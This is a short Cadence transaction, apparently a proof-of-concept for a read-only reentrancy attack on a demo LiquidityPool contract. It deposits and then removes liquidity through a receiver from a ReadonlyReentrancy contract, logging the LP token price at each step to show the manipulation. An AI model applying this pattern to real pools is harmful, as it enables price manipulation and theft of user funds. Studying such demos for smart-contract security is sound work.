import FungibleToken from "../contracts/utility/FungibleToken.cdc"
import FlowToken from "../contracts/utility/FlowToken.cdc"
import LiquidityPool from "../contracts/LiquidityPool.cdc"
import ReadonlyReentrancy from "../contracts/ReadonlyReentrancy.cdc"

transaction(amount: UFix64) {
	let address: Address
	let vault: &FlowToken.Vault

	prepare(signer: AuthAccount) {
		self.address = signer.address
		let vaultRef = signer.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)
			?? panic("Could not borrow reference to the owner's Vault!")
		self.vault = vaultRef
	}

	execute {
		log("LPToken price before deposit: ".concat(LiquidityPool.getPrice().toString()))
		let flowTokenVault <- self.vault.withdraw(amount: amount) as! @FlowToken.Vault
		let lpTokenVault <- LiquidityPool.add(<-flowTokenVault)
		log("LPToken price after deposit: ".concat(LiquidityPool.getPrice().toString()))
		let receiver <- ReadonlyReentrancy.createReceiver(receiver: self.address)
		LiquidityPool.remove(<-lpTokenVault, receiver: &receiver as &{FungibleToken.Receiver})
		destroy receiver
		log("LPToken price after remove: ".concat(LiquidityPool.getPrice().toString()))
	}
}